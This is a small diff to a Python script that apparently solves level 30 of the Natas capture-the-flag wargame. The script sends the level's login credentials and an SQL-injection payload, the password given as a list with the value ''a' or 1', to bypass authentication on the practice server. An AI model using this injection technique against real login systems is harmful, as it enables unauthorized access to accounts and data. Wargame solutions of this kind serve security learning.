@@ -6,7 +6,7 @@ AUTH = ("natas30", "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF")
 
 payload = {
     "username": "natas31",
-    "password": ['a" or 1', 2]
+    "password": ["'a' or 1", 2]
 }
 
 response = requests.post(url=URL, auth=AUTH, data=payload)
